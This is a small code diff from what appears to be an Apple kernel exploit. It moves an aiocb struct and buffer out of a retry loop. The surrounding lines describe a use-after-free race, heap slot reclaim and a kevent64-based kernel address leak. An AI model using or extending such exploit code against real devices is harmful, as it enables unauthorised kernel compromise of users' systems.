@@ -5790,6 +5790,8 @@ static void *e2_free_and_ool_racer(void *arg) {
     // kevent64(timeout=0) reads cached ext[] from tcb's knote → addr leak.
 
     uint64_t entryAddr = 0;  // kernel address of reclaimed slot S
+    static struct aiocb tcb;    // declared here so Phase C can access it
+    static char tbuf[4096];
 
     for (int attempt = 0; attempt < 5; attempt++) {
         [self appendLog:[NSString stringWithFormat:@"Phase A v31 attempt %d/5", attempt + 1]];
@@ -5802,8 +5804,6 @@ static void *e2_free_and_ool_racer(void *arg) {
             continue;
         }
 
-        static struct aiocb tcb;
-        static char tbuf[4096];
         memset(&tcb, 0, sizeof(tcb));
         tcb.aio_fildes = fd;
         tcb.aio_buf = tbuf;
